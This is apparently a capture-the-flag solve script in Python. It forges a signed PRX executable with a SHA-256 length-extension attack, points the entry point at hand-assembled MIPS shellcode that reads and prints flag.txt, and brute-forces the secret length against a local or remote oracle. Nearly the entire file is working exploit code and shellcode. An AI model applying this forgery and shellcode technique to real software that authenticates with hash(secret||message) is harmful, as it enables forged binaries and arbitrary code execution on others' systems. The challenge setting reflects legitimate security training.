#!/usr/bin/env python3

import argparse
import base64
import os
import re
import socket
import ssl
import struct
import subprocess
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src", "tools"))
import prism

MAC_OFF, MAC_END = 0x10, 0x30
HDR_SIZE = 0x30
PHDR_SIZE = 0x10
ENTRY_OFF = 0x08

# Scratch read buffer VA
BUF_VA = 0x00500000

# Linux/MIPS o32 syscall numbers
SYS_EXIT, SYS_READ, SYS_WRITE, SYS_OPEN = 4001, 4003, 4004, 4005

# Minimal SHA-256 with length-extension support
_K = [
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2,
]


def _rotr(x, n):
    return ((x >> n) | (x << (32 - n))) & 0xffffffff


def _compress(state, block):
    w = list(struct.unpack(">16I", block))
    for i in range(16, 64):
        s0 = _rotr(w[i-15], 7) ^ _rotr(w[i-15], 18) ^ (w[i-15] >> 3)
        s1 = _rotr(w[i-2], 17) ^ _rotr(w[i-2], 19) ^ (w[i-2] >> 10)
        w.append((w[i-16] + s0 + w[i-7] + s1) & 0xffffffff)
    a, b, c, d, e, f, g, h = state
    for i in range(64):
        S1 = _rotr(e, 6) ^ _rotr(e, 11) ^ _rotr(e, 25)
        ch = (e & f) ^ (~e & g)
        t1 = (h + S1 + ch + _K[i] + w[i]) & 0xffffffff
        S0 = _rotr(a, 2) ^ _rotr(a, 13) ^ _rotr(a, 22)
        maj = (a & b) ^ (a & c) ^ (b & c)
        t2 = (S0 + maj) & 0xffffffff
        h, g, f, e = g, f, e, (d + t1) & 0xffffffff
        d, c, b, a = c, b, a, (t1 + t2) & 0xffffffff
    return [(x + y) & 0xffffffff for x, y in zip(state, (a, b, c, d, e, f, g, h))]


def _padding(msg_len):
    pad = b"\x80"
    while (msg_len + len(pad)) % 64 != 56:
        pad += b"\x00"
    return pad + struct.pack(">Q", msg_len * 8)


def length_extend(orig_tag, total_prefixed_len, ext):
    """Forge SHA-256(prefix || glue || ext)"""
    glue = _padding(total_prefixed_len)
    state = list(struct.unpack(">8I", orig_tag))
    final_len = total_prefixed_len + len(glue) + len(ext)
    data = ext + _padding(final_len)
    for off in range(0, len(data), 64):
        state = _compress(state, data[off:off+64])
    return struct.pack(">8I", *state), glue


ZERO, V0, A0, A1, A2 = 0, 2, 4, 5, 6


def _itype(op, rs, rt, imm):
    return ((op & 0x3f) << 26) | ((rs & 0x1f) << 21) | ((rt & 0x1f) << 16) | (imm & 0xffff)


def _lui(rt, imm):       return _itype(0x0f, 0, rt, imm)
def _ori(rt, rs, imm):   return _itype(0x0d, rs, rt, imm)
def _or(rd, rs, rt):     return ((rs & 0x1f) << 21) | ((rt & 0x1f) << 16) | ((rd & 0x1f) << 11) | 0x25
_SYSCALL = 0x0000000c


def _la(reg, addr):
    """Load a full 32-bit absolute address (lui + ori, sign-safe)."""
    return [_lui(reg, (addr >> 16) & 0xffff), _ori(reg, reg, addr & 0xffff)]


# 21 fixed-length instructions; the flag path string follows immediately after.
_N_INSNS = 21


def build_shellcode(payload_va, buf_va):
    flag_va = payload_va + _N_INSNS * 4          # "flag.txt" sits right after the code
    insns = []
    insns += _la(A0, flag_va)                    # open("flag.txt",
    insns += [_ori(A1, ZERO, 0)]                 #      O_RDONLY,
    insns += [_ori(A2, ZERO, 0)]                 #      0)
    insns += [_ori(V0, ZERO, SYS_OPEN), _SYSCALL]
    insns += [_or(A0, ZERO, V0)]                 # read(fd,
    insns += _la(A1, buf_va)                     #      buf,
    insns += [_ori(A2, ZERO, 256)]               #      256)
    insns += [_ori(V0, ZERO, SYS_READ), _SYSCALL]
    insns += [_or(A2, ZERO, V0)]                 # write(1, buf, n)  (n = bytes read)
    insns += [_ori(A0, ZERO, 1)]
    insns += _la(A1, buf_va)
    insns += [_ori(V0, ZERO, SYS_WRITE), _SYSCALL]
    insns += [_ori(A0, ZERO, 0)]                 # exit(0)
    insns += [_ori(V0, ZERO, SYS_EXIT), _SYSCALL]
    assert len(insns) == _N_INSNS, len(insns)
    # Encode each instruction word to PRISM; the flag-path string stays raw data.
    code = b"".join(struct.pack("<I", prism.encode_word(w)) for w in insns)
    return code + b"flag.txt\x00"


# --- exploit driver -------------------------------------------------------
def u32(buf, off):
    return struct.unpack_from("<I", buf, off)[0]


def forge(prx, secret_len):
    """Build a forged PRX for a guessed secret length."""
    msg = prx[HDR_SIZE:]
    tag = prx[MAC_OFF:MAC_END]
    phnum = prx[5]
    last_ph = HDR_SIZE + (phnum - 1) * PHDR_SIZE # the spillover is the last phdr
    off_last = u32(prx, last_ph + 0)
    va_last = u32(prx, last_ph + 4)
    eff_orig = len(prx) - off_last  # original eff_filesz of the last segment

    total = secret_len + len(msg)
    glue = _padding(total)
    payload_va = va_last + eff_orig + len(glue) # where S lands in the grown last segment
    shellcode = build_shellcode(payload_va, BUF_VA)
    forged_tag, _ = length_extend(tag, total, shellcode)

    out = bytearray(prx[:HDR_SIZE])
    struct.pack_into("<I", out, ENTRY_OFF, payload_va)   # redirect entry (unauthenticated)
    out[MAC_OFF:MAC_END] = forged_tag                    # forged tag (authenticated body)
    out += msg + glue + shellcode
    return bytes(out), payload_va




class LocalOracle:
    SECRET = "00112233445566778899aabbccddeeff"

    def __init__(self, executor, scratch, secret):
        self.executor = executor
        self.scratch = scratch
        self.secret = secret or LocalOracle.SECRET

    def submit(self, forged):
        with open(self.scratch, "wb") as f:
            f.write(forged)
        env = dict(os.environ, SECRET=self.secret)
        res = subprocess.run([self.executor, self.scratch], capture_output=True, env=env)
        accepted = b"[+] Verified" in res.stderr
        return accepted, res.stdout

    def describe(self):
        return f"local executor {self.executor} (SECRET baked)"


class RemoteOracle:
    def __init__(self, host, port, timeout=10.0, use_ssl=True):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.use_ssl = use_ssl

    def submit(self, forged):
        line = base64.b64encode(forged) + b"\n"
        sock = socket.create_connection((self.host, self.port), self.timeout)
        try:
            if self.use_ssl:
                # The deployed service is fronted by `ncat --ssl`
                ctx = ssl._create_unverified_context()
                sock = ctx.wrap_socket(sock, server_hostname=self.host)
            sock.settimeout(self.timeout)
            sock.sendall(line)
            chunks = []
            try:
                while True:
                    b = sock.recv(4096)
                    if not b:
                        break
                    chunks.append(b)
            except socket.timeout:
                pass
        finally:
            sock.close()
        return None, b"".join(chunks)

    def describe(self):
        scheme = "ssl" if self.use_ssl else "tcp"
        return f"remote {scheme}://{self.host}:{self.port}"


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("prx", nargs="?", default=None)
    ap.add_argument("--target", choices=("local", "remote"), default="local")
    ap.add_argument("--executor", default="./dist/executor")
    ap.add_argument("--secret")
    ap.add_argument("--host", default="localhost")
    ap.add_argument("--port", type=int, default=1337)
    ap.add_argument("--no-ssl", dest="ssl", action="store_false")
    ap.add_argument("--out", default="solution/echo.exploit.prx",)
    ap.add_argument("--maxlen", type=int, default=32, help="max secret length to try")
    args = ap.parse_args()

    if args.prx is None:
        args.prx = "dist/echo.remote.prx" if args.target == "remote" else "dist/echo.local.prx"

    if args.target == "remote":
        oracle = RemoteOracle(args.host, args.port, use_ssl=args.ssl)
    else:
        secret = args.secret or os.environ.get("SECRET")
        oracle = LocalOracle(args.executor, args.out, secret)

    prx = open(args.prx, "rb").read()
    print(f"[*] target: {args.prx} ({len(prx)} bytes)  oracle: {oracle.describe()}")
    print(f"[*] brute-forcing len(secret) 1..{args.maxlen}")

    for L in range(1, args.maxlen + 1):
        forged, payload_va = forge(prx, L)
        try:
            accepted, resp = oracle.submit(forged)
        except OSError as e:
            print(f"\n[!] oracle submit failed: {e}", file=sys.stderr)
            return 1
        m = re.search(rb"L3AK\{[^}]*\}", resp)
        if accepted or m:
            with open(args.out, "wb") as f:
                f.write(forged)
            print(f"[+] len(secret) = {L}  ->  entry forged to 0x{payload_va:08x}")
            print(f"[+] oracle accepted the forgery and ran the shellcode")
            print(f"[+] saved: {args.out} ({len(forged)} bytes)")
            if m:
                print(f"[+] flag: {m.group(0).decode('latin1')}")
            else:
                print("[!] accepted, but no flag in the output -- no flag.txt in "
                      "the cwd? (the live server has /challenge/flag.txt)")
            return 0
        print(f"  [-] len={L:<2} rejected", end="\r", flush=True)

    print("\n[!] no accepted length found within range", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
